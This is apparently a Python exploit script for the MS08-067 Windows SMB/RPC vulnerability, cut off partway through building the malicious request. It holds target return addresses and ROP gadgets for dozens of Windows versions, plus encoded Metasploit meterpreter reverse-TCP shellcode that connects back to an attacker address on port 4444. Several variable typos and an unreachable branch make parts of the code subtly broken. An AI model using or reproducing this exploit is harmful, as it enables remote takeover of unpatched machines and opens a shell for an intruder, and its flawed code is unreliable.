#!/bin/python

import sys, time, struct
from impacket.dcerpc.v5 import transport
from impacket import uuid, dcerpc, smb

print "##########################################################################"
print "#                                                                        #"
print "# MS08-067 Exploit                                                       #"
print "# Exploit written by Erwin Wildenburg                                    #"
print "# https://www.thinc.ninja/                                               #"
print "#                                                                        #"
print "##########################################################################\n"

if len(sys.argv) != 3:
	print "Usage: %s <target ip> <target>\n" % sys.argv[0]
	print "Targets:"
	print "[0] Automatic Targeting"
	print "[1] Windows 2000 Universal"
	print "[2] Windows XP SP0/SP1 Universal"
	print "[3] Windows 2003 SP0 Universal"
	print "[4] Windows XP SP2 English (AlwaysOn NX)"
	print "[5] Windows XP SP2 English (NX)"
	print "[6] Windows XP SP3 English (AlwaysOn NX)"
	print "[7] Windows XP SP3 English (NX)"
	print "[8] Windows XP SP2 Arabic (NX)"
	print "[9] Windows XP SP2 Chinese - Traditional / Taiwan (NX)"
	print "[10] Windows XP SP2 Chinese - Simplified (NX)"
	print "[11] Windows XP SP2 Chinese - Traditional (NX)"
	print "[12] Windows XP SP2 Czech (NX)"
	print "[13] Windows XP SP2 Danish (NX)"
	print "[14] Windows XP SP2 German (NX)"
	print "[15] Windows XP SP2 Greek (NX)"
	print "[16] Windows XP SP2 Spanish (NX)"
	print "[17] Windows XP SP2 Finnish (NX)"
	print "[18] Windows XP SP2 French (NX)"
	print "[19] Windows XP SP2 Hebrew (NX)"
	print "[20] Windows XP SP2 Hungarian (NX)"
	print "[21] Windows XP SP2 Italian (NX)"
	print "[22] Windows XP SP2 Japanese (NX)"
	print "[23] Windows XP SP2 Korean (NX)"
	print "[24] Windows XP SP2 Dutch (NX)"
	print "[25] Windows XP SP2 Norwegian (NX)"
	print "[26] Windows XP SP2 Polish (NX)"
	print "[27] Windows XP SP2 Portuguese - Brazilian (NX)"
	print "[28] Windows XP SP2 Portuguese (NX)"
	print "[29] Windows XP SP2 Russian (NX)"
	print "[30] Windows XP SP2 Swedish (NX)"
	print "[31] Windows XP SP2 Turkish (NX)"
	print "[32] Windows XP SP3 Arabic (NX)"
	print "[33] Windows XP SP3 Chinese - Traditional / Taiwan (NX)"
	print "[34] Windows XP SP3 Chinese - Simplified (NX)"
	print "[35] Windows XP SP3 Chinese - Traditional (NX)"
	print "[36] Windows XP SP3 Czech (NX)"
	print "[37] Windows XP SP3 Danish (NX)"
	print "[38] Windows XP SP3 German (NX)"
	print "[39] Windows XP SP3 Greek (NX)"
	print "[40] Windows XP SP3 Spanish (NX)"
	print "[41] Windows XP SP3 Finnish (NX)"
	print "[42] Windows XP SP3 French (NX)"
	print "[43] Windows XP SP3 Hebrew (NX)"
	print "[44] Windows XP SP3 Hungarian (NX)"
	print "[45] Windows XP SP3 Italian (NX)"
	print "[46] Windows XP SP3 Japanese (NX)"
	print "[47] Windows XP SP3 Korean (NX)"
	print "[48] Windows XP SP3 Dutch (NX)"
	print "[49] Windows XP SP3 Norwegian (NX)"
	print "[50] Windows XP SP3 Polish (NX)"
	print "[51] Windows XP SP3 Portuguese - Brazilian (NX)"
	print "[52] Windows XP SP3 Portuguese (NX)"
	print "[53] Windows XP SP3 Russian (NX)"
	print "[54] Windows XP SP3 Swedish (NX)"
	print "[55] Windows XP SP3 Turkish (NX)"
	print "[56] Windows 2003 SP1 English (NO NX)"
	print "[57] Windows 2003 SP1 English (NX)"
	print "[58] Windows 2003 SP1 Japanese (NO NX)"
	print "[59] Windows 2003 SP1 Spanish (NO NX)"
	print "[60] Windows 2003 SP1 Spanish (NX)"
	print "[61] Windows 2003 SP1 French (NO NX)"
	print "[62] Windows 2003 SP1 French (NX)"
	print "[63] Windows 2003 SP2 English (NO NX)"
	print "[64] Windows 2003 SP2 English (NX)"
	print "[65] Windows 2003 SP2 German (NO NX)"
	print "[66] Windows 2003 SP2 German (NX)"
	print "[67] Windows 2003 SP2 Portuguese - Brazilian (NX)"
	print "[68] Windows 2003 SP2 Spanish (NO NX)"
	print "[69] Windows 2003 SP2 Spanish (NX)"
	print "[70] Windows 2003 SP2 Japanese (NO NX)"
	print "[71] Windows 2003 SP2 French (NO NX)"
	print "[72] Windows 2003 SP2 French (NX)"
	exit(1)

# Target connection details
host = sys.argv[1]
port = 445
target = int(sys.argv[2])

#################################################
# Auto detect target
#################################################
if target == 0:
	print "[*] Automatically detecting target..."
	print "[-] UNIMPLEMENTED: Still need to figure out how to do SMB fingerprint..."
	exit(1)

#################################################
# Targets
#################################################
if target == 1:
	print "[*] Targeting Windows 2000 Universal"
	ret = "\xb0\x1c\x1f\x00" # JMP EDI SVCHOST.EXE
elif target == 2:
	print "[*] Targeting Windows XP SP0/SP1 Universal"
	ret = "\x61\x13\x00\x01" # JMP ESI SVCHOST.EXE
elif target == 3:
	print "[*] Targeting Windows 2003 SP0 Universal"
	ret = "\x9e\x12\x00\x01" # JMP ESI SVCHOST.EXE
elif target == 4:
	print "[*] Targeting Windows XP SP2 English (AlwaysOn NX)"
	userop = "5.1.2600.2180" # No pivot is needed, we drop into our rop
elif target == 5:
	print "[*] Targeting Windows XP SP2 English (NX)"
	ret = "\x27\xf7\x88\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x89\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 6:
	print "[*] Targeting Windows XP SP3 English (AlwaysOn NX)"
	userop = "5.1.2600.5512" # No pivot is needed, we drop into our rop
elif target == 7:
	print "[*] Targeting Windows XP SP3 English (NX)"
	ret = "\x07\xf8\x88\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x89\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 8:
	print "[*] Targeting Windows XP SP2 Arabic (NX)"
	ret = "\x27\xf7\xd8\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xd9\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 9:
	print "[*] Targeting Windows XP SP2 Chinese - Traditional / Taiwan (NX)"
	ret = "\x27\xf7\x60\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x61\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 10:
	print "[*] Targeting Windows XP SP2 Chinese - Simplified (NX)"
	ret = "\x27\xf7\xfb\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xfc\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 11:
	print "[*] Targeting Windows XP SP2 Chinese - Traditional (NX)"
	ret = "\x27\xf7\x60\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x61\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 12:
	print "[*] Targeting Windows XP SP2 Czech (NX)"
	ret = "\x27\xf7\xe1\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xe2\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 13:
	print "[*] Targeting Windows XP SP2 Danish (NX)"
	ret = "\x27\xf7\x78\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x79\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 14:
	print "[*] Targeting Windows XP SP2 German (NX)"
	ret = "\x27\xf7\xd9\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xda\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 15:
	print "[*] Targeting Windows XP SP2 Greek (NX)"
	ret = "\x27\xf7\x2a\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x2b\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 16:
	print "[*] Targeting Windows XP SP2 Spanish (NX)"
	ret = "\x27\xf7\xdb\x6f", # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xdc\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 17:
	print "[*] Targeting Windows XP SP2 Finnish (NX)"
	ret = "\x27\xf7\x7d\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x7e\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 18:
	print "[*] Targeting Windows XP SP2 French (NX)"
	ret = "\x27\xf7\x5b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x5c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 19:
	print "[*] Targeting Windows XP SP2 Hebrew (NX)"
	ret = "\x27\xf7\x40\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x41\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 20:
	print "[*] Targeting Windows XP SP2 Hungarian (NX)"
	ret = "\x27\xf7\x70\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x71\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 21:
	print "[*] Targeting Windows XP SP2 Italian (NX)"
	ret = "\x27\xf7\x6b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x6c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 22:
	print "[*] Targeting Windows XP SP2 Japanese (NX)"
	ret = "\xbe\xd3\x7f\x56" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x80\x56" # NX/NX BYPASS ACGENRAL.DLL
elif target == 23:
	print "[*] Targeting Windows XP SP2 Korean (NX)"
	ret = "\x27\xf7\xd6\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xd7\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 24:
	print "[*] Targeting Windows XP SP2 Dutch (NX)"
	ret = "\x27\xf7\x6c\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x6d\x59" # NX/NX BYPASS ACGENRAL.DLL
	scratch = "\x08\x04\x02\x00"
elif target == 25:
	print "[*] Targeting Windows XP SP2 Norwegian (NX)"
	ret = "\x27\xf7\x7c\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x7d\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 26:
	print "[*] Targeting Windows XP SP2 Polish (NX)"
	ret = "\x27\xf7\x41\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x42\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 27:
	print "[*] Targeting Windows XP SP2 Portuguese - Brazilian (NX)"
	ret = "\x27\xf7\x6f\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x70\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 28:
	print "[*] Targeting Windows XP SP2 Portuguese (NX)"
	ret = "\x27\xf7\x6b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x6c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 29:
	print "[*] Targeting Windows XP SP2 Russian (NX)"
	ret = "\x27\xf7\xe1\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\xe2\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 30:
	print "[*] Targeting Windows XP SP2 Swedish (NX)"
	ret = "\x27\xf7\x7a\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x7b\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 31:
	print "[*] Targeting Windows XP SP2 Turkish (NX)"
	ret = "\x27\xf7\x78\x5a" # JMP ESI ACGENRAL.DLL
	disablenx = "\xe2\x16\x79\x5a" # NX/NX BYPASS ACGENRAL.DLL
elif target == 32:
	print "[*] Targeting Windows XP SP3 Arabic (NX)"
	ret = "\x07\xf8\xd8\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xd9\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 33:
	print "[*] Targeting Windows XP SP3 Chinese - Traditional / Taiwan (NX)"
	ret = "\x07\xf8\x60\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x61\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 34:
	print "[*] Targeting Windows XP SP3 Chinese - Simplified (NX)"
	ret = "\x07\xf8\xfb\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xfc\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 35:
	print "[*] Targeting Windows XP SP3 Chinese - Traditional (NX)"
	ret = "\x07\xf8\x60\x58" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x61\x58" # NX/NX BYPASS ACGENRAL.DLL
elif target == 36:
	print "[*] Targeting Windows XP SP3 Czech (NX)"
	ret = "\x07\xf8\xe1\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xe2\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 37:
	print "[*] Targeting Windows XP SP3 Danish (NX)"
	ret = "\x07\xf8\x78\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x79\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 38:
	print "[*] Targeting Windows XP SP3 German (NX)"
	ret = "\x07\xf8\xd9\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xda\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 39:
	print "[*] Targeting Windows XP SP3 Greek (NX)"
	ret = "\x07\xf8\x2a\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x2b\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 40:
	print "[*] Targeting Windows XP SP3 Spanish (NX)"
	ret = "\x07\xf8\xdb\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xdc\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 41:
	print "[*] Targeting Windows XP SP3 Finnish (NX)"
	ret = "\x07\xf8\x7d\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x7e\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 42:
	print "[*] Targeting Windows XP SP3 French (NX)"
	ret = "\x07\xf8\x5b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x5c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 43:
	print "[*] Targeting Windows XP SP3 Hebrew (NX)"
	ret = "\x07\xf8\x40\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x41\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 44:
	print "[*] Targeting Windows XP SP3 Hungarian (NX)"
	ret = "\x07\xf8\x70\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x71\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 45:
	print "[*] Targeting Windows XP SP3 Italian (NX)"
	ret = "\x07\xf8\x6b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x6c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 46:
	print "[*] Targeting Windows XP SP3 Japanese (NX)"
	ret = "\xd2\xd4\x7f\x56" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x80\x56" # NX/NX BYPASS ACGENRAL.DLL
elif target == 47:
	print "[*] Targeting Windows XP SP3 Korean (NX)"
	ret = "\x07\xf8\xd6\x6f" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\xd7\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 48:
	print "[*] Targeting Windows XP SP3 Dutch (NX)"
	ret = "\x07\xf8\x6c\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x6d\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 49:
	print "[*] Targeting Windows XP SP3 Norwegian (NX)"
	ret = "\x07\xf8\x7c\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x7d\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 50:
	print "[*] Targeting Windows XP SP3 Polish (NX)"
	ret = "\x07\xf8\x41\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x42\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 51:
	print "[*] Targeting Windows XP SP3 Portuguese - Brazilian (NX)"
	ret = "\x07\xf8\x6f\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x70\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 52:
	print "[*] Targeting Windows XP SP3 Portuguese (NX)"
	ret = "\x07\xf8\x6b\x59" # JMP ESI ACGENRAL.DLL
	disablenx = "\xc2\x17\x6c\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 53:
	print "[*] Targeting Windows XP SP3 Russian (NX)"
	ret = "\x07\xf8\xe1\x6f" # JMP ESI ACGENRAL.DLL
	disablerx = "\xc2\x17\xe2\x6f" # NX/NX BYPASS ACGENRAL.DLL
elif target == 54:
	print "[*] Targeting Windows XP SP3 Swedish (NX)"
	ret = "\x07\xf8\x7a\x59" # JMP ESI ACGENRAL.DLL
	disablerx = "\xc2\x17\x7b\x59" # NX/NX BYPASS ACGENRAL.DLL
elif target == 55:
	print "[*] Targeting Windows XP SP3 Turkish (NX)"
	ret = "\x07\xf8\x78\x5a" # JMP ESI ACGENRAL.DLL
	disablerx = "\xc2\x17\x79\x5a" # NX/NX BYPASS ACGENRAL.DLL
elif target == 56:
	print "[*] Targeting Windows 2003 SP1 English (NO NX)"
	ret = "\xa2\x21\xbf\x71" # CALL ESI WS2HELP.DLL
elif target == 57:
	print "[*] Targeting Windows 2003 SP1 English (NX)"
	retdec = "\x8c\x56\x90\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\xf4\x7c\xa2\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\xd3\xfe\x86\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x13\xe4\x83\x7c" # NX disable @NTDLL.DLL
elif target == 58:
	print "[*] Targeting Windows 2003 SP2 Japanese (NO NX)"
	ret = "\xd2\x1e\xa9\x71" # CALL ESI WS2HELP.DLL
elif target == 59:
	print "[*] Targeting Windows 2003 SP1 Spanish (NO NX)"
	ret = "\xa2\x21\xac\x71" # CALL ESI WS2HELP.DLL
elif target == 60:
	print "[*] Targeting Windows 2003 SP1 Spanish (NX)"
	retdec = "\x8c\x56\x90\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\xf4\x7c\xa2\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\xd3\xfe\x86\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x13\xe4\x83\x7c" # NX disable @NTDLL.DLL
elif target == 61:
	print "[*] Targeting Windows 2003 SP1 French (NO NX)"
	ret = "\x40\x1c\xac\x71" # CALL ESI WS2HELP.DLL
elif target == 62:
	print "[*] Targeting Windows 2003 SP1 French (NX)"
	retdec = "\x8C\x56\xA2\x7C" # dec ESI, ret @NTDLL.DLL
	retpop = "\xF4\x7C\xB4\x7C" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\xD3\xFE\x98\x7C" # jmp ESP @NTDLL.DLL
	disablenx = "\x13\xE4\x95\x7C" # NX disable @NTDLL.DLL
elif target == 63:
	print "[*] Targeting Windows 2003 SP2 English (NO NX)"
	ret = "\x69\x39\xbf\x71" # CALL ESI WS2HELP.DLL
elif target == 64:
	print "[*] Targeting Windows 2003 SP2 English (NX)"
	retdec = "\xb8\xbe\x86\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\x4e\xe8\xa1\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\x1b\xa0\x86\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x17\xf5\x83\x7c" # NX disable @NTDLL.DLL
elif target == 65:
	print "[*] Targeting Windows 2003 SP2 German (NO NX)"
	ret = "\x69\x39\xa0\x71" # CALL ESI WS2HELP.DLL
elif target == 66:
	print "[*] Targeting Windows 2003 SP2 German (NX)"
	retdec = "\xb8\xbe\x98\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\x4e\xe8\xb3\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\x1b\xa0\x98\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x17\xf5\x95\x7c" # NX disable @NTDLL.DLL
elif target == 67:
	print "[*] Targeting Windows 2003 SP2 Portuguese - Brazilian (NX)"
	retdec = "\xb8\xbe\x97\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\x4e\xe8\xb2\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\x1b\xa0\x97\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x17\xf5\x94\x7c" # NX disable @NTDLL.DLL
elif target == 68:
	print "[*] Targeting Windows 2003 SP2 Spanish (NO NX)"
	ret = "\x69\x39\xac\x71" # CALL ESI WS2HELP.DLL
elif target == 69:
	print "[*] Targeting Windows 2003 SP2 Spanish (NX)"
	retdec = "\xb8\xbe\x86\x7c" # dec ESI, ret @NTDLL.DLL
	retpop = "\x4e\xe8\xa1\x7c" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\x1b\xa0\x86\x7c" # jmp ESP @NTDLL.DLL
	disablenx = "\x17\xf5\x83\x7c" # NX disable @NTDLL.DLL
elif target == 70:
	print "[*] Targeting Windows 2003 SP2 Japanese (NO NX)"
	ret = "\xd2\x1e\xa9\x71" # CALL ESI WS2HELP.DLL
elif target == 71:
	print "[*] Targeting Windows 2003 SP2 French (NO NX)"
	ret = "\x69\x20\xAC\x71" # CALL ESI WS2HELP.DLL
elif target == 72:
	print "[*] Targeting Windows 2003 SP2 French (NX)"
	retdec = "\xB8\xBE\x98\x7C" # dec ESI, ret @NTDLL.DLL
	retpop = "\x4E\xE8\xB3\x7C" # push ESI, pop EBP, ret @SHELL32.DLL
	jmpesp = "\x1B\xA0\x98\x7C" # jmp ESP @NTDLL.DLL
	disablenx = "\x17\xF5\x95\x7C" # NX disable @NTDLL.DLL
else:
	print "[x] Target not implemented"
	exit(1)

#################################################
# Shellcode
#################################################

nopsled = "\x90" * 30

# windows/meterpreter/reverse_tcp - 380 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/call4_dword_xor
# VERBOSE=false, LHOST=192.168.189.138, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependMigrate=false, 
# EXITFUNC=thread, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300
# BadCharacters=\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40
buf =  ""
buf += "\x33\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x42\x92\xb9\xba\x83\xee\xfc\xe2\xf4\xbe\x7a"
buf += "\x3b\xba\x42\x92\xd9\x33\xa7\xa3\x79\xde\xc9\xc2\x89"
buf += "\x31\x10\x9e\x32\xe8\x56\x19\xcb\x92\x4d\x25\xf3\x9c"
buf += "\x73\x6d\x15\x86\x23\xee\xbb\x96\x62\x53\x76\xb7\x43"
buf += "\x55\x5b\x48\x10\xc5\x32\xe8\x52\x19\xf3\x86\xc9\xde"
buf += "\xa8\xc2\xa1\xda\xb8\x6b\x13\x19\xe0\x9a\x43\x41\x32"
buf += "\xf3\x5a\x71\x83\xf3\xc9\xa6\x32\xbb\x94\xa3\x46\x16"
buf += "\x83\x5d\xb4\xbb\x85\xaa\x59\xcf\xb4\x91\xc4\x42\x79"
buf += "\xef\x9d\xcf\xa6\xca\x32\xe2\x66\x93\x6a\xdc\xc9\x9e"
buf += "\xf2\x31\x1a\x8e\xb8\x69\xc9\x96\x32\xbb\x92\x1b\xfd"
buf += "\x9e\x66\xc9\xe2\xdb\x1b\xc8\xe8\x45\xa2\xcd\xe6\xe0"
buf += "\xc9\x80\x52\x37\x1f\xfa\x8a\x88\x42\x92\xd1\xcd\x31"
buf += "\xa0\xe6\xee\x2a\xde\xce\x9c\x45\x6d\x6c\x02\xd2\x93"
buf += "\xb9\xba\x6b\x56\xed\xea\x2a\xbb\x39\xd1\x42\x6d\x6c"
buf += "\xd0\x47\xfa\x79\x12\xff\x18\xd1\xb8\x42\x83\xe5\x33"
buf += "\xa4\xc2\xe9\xea\x12\xd2\xe9\xfa\x12\xfa\x53\xb5\x9d"
buf += "\x72\x46\x6f\xd5\xf8\xa9\xec\x15\xfa\x20\x1f\x36\xf3"
buf += "\x46\x6f\xc7\x52\xcd\xb0\xbd\xdc\xb1\xcf\xae\x7a\xd8"
buf += "\xba\x42\x92\xd3\xba\x28\x96\xef\xed\x2a\x90\x60\x72"
buf += "\x1d\x6d\x6c\x39\xba\x92\xc7\x8c\xc9\xa4\xd3\xfa\x2a"
buf += "\x92\xa9\xba\x42\xc4\xd3\xba\x2a\xca\x1d\xe9\xa7\x6d"
buf += "\x6c\x29\x11\xf8\xb9\xec\x11\xc5\xd1\xb8\x9b\x5a\xe6"
buf += "\x45\x97\x11\x41\xba\x3f\xb0\xe1\xd2\x42\xd2\xb9\xba"
buf += "\x28\x92\xe9\xd2\x49\xbd\xb6\x8a\xbd\x47\xee\xd2\x37"
buf += "\xfc\xf4\xdb\xbd\x47\xe7\xe4\xbd\x9e\x9d\x53\x33\x6d"
buf += "\x46\x45\x43\x51\x90\x7c\x37\x55\x7a\x01\xa2\x8f\x93"
buf += "\xb0\x2a\x34\x2c\x07\xdf\x6d\x6c\x86\x44\xee\xb3\x3a"
buf += "\xb9\x72\xcc\xbf\xf9\xd5\xaa\xc8\x2d\xf8\xb9\xe9\xbd"
buf += "\x47\xb9\xba"

#################################################
# Generate jumper
#################################################
jumper = ""
if "userop" in vars():
	rvasets = { }
	# Windows XP SP2
	rvasets['5.1.2600.2180'] = {
      		# call [imp_HeapCreate] / mov [0x6f8b8024], eax / ret
		'call_HeapCreate': 0x21064,
		'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e546,
		'pop ecx / ret': 0x2e546 + 6,
		'mov [eax], ecx / ret': 0xd182,
		'jmp eax': 0x19b85,
		'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10976,
		'mov [eax+0x10], ecx / ret': 0x10976 + 6,
		'add eax, 8 / ret': 0x29a14
	}
	# Windows XP SP3
	rvasets['5.1.2600.5512'] = {
		# call [imp_HeapCreate] / mov [0x6f8b02c], eax / ret
		"call_HeapCreate": 0x21286,
		"add eax, ebp / mov ecx, 0x59ffffa8 / ret": 0x2e796,
		"pop ecx / ret": 0x2e796 + 6,
		"mov [eax], ecx / ret": 0xd296,
		"jmp eax": 0x19c6f,
		"mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret": 0x10a56,
		"mov [eax+0x10], ecx / ret": 0x10a56 + 6,
		"add eax, 8 / ret": 0x29c64
	}

	module_base = 0x6f880000
	rva = rvasets[userop]
	
	gadget1 = "\x90\x5a\x59\xc3" # pop edx; pop ecx; ret
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"] # mov edi, eax; add edi,0xc; push 0x40; pop ecx; rep movsd
	gadget3 = "\xcc\x90\xeb\x5a" #<must complete \x00 two byte opcode>; <free_byte>; jmp $+0x5c

	jumper += struct.pack('<L', 0x00018000)
	jumper += struct.pack('<L', rva['call_HeapCreate'] + module_base)
	jumper += struct.pack('<L', 0x01040110)
	jumper += struct.pack('<L', 0x01010101)
	jumper += struct.pack('<L', 0x01010101)
	jumper += struct.pack('<L', rva['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
	jumper += struct.pack('<L', rva['pop ecx / ret'] + module_base)
	jumper += gadget1
	jumper += struct.pack('<L', rva['mov [eax], ecx / ret'] + module_base)
	jumper += struct.pack('<L', rva['jmp eax'] + module_base)
	jumper += gadget2[0]
	jumper += gadget2[1]
	jumper += struct.pack('<L', rva['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
	jumper += struct.pack('<L', rva['pop ecx / ret'] + module_base)
	jumper += gadget2[2]
	jumper += struct.pack('<L', rva['mov [eax+0x10], ecx / ret'] + module_base)
	jumper += struct.pack('<L', rva['add eax, 8 / ret'] + module_base)
	jumper += struct.pack('<L', rva['jmp eax'] + module_base)
	jumper += gadget3
	jumper += "AB"
elif not "userop" in vars():
	jumper += "\x08\x04\x02\x00"
	if "disablenx" in vars():
		jumper += disablenx
	else:
		jumper += ret
	jumper += "A" * 4
	jumper += ret
	jumper += "A" * 42
	jumper += "\x90" * 8 # nops
	jumper += "\xeb\x62"
	jumper += "A" * 10
elif "retdec" in vars():
	jumper += "\x08\x04\x02\x00"
	jumper += retdec * 6
	jumper += retpop
	jumper += disablenx
	jumper += "A" * 28
	jumper += jmpesp
	jumper += "\xeb\x02"
	jumper += "\x90" * 2
	jumper += "\xeb\x62"

#################################################
# Send the exploit
#################################################

path = ""
path += "\x5c\x00" # Prefix (\\)
path += "ABCDEFGHIJ" * 10 # This buffer is removed from the front
path += nopsled # Nopsled
path += buf # Shellcode
path += "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" # Relative path to trigger the bug (\\..\\..\\)
path += "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" # Extra padding
if not "userop" in vars():
	path += "\x08\x04\x02\x00" # Writable memory location (static)
	if "disablenx" in vars():
		path += disablenx
	else:
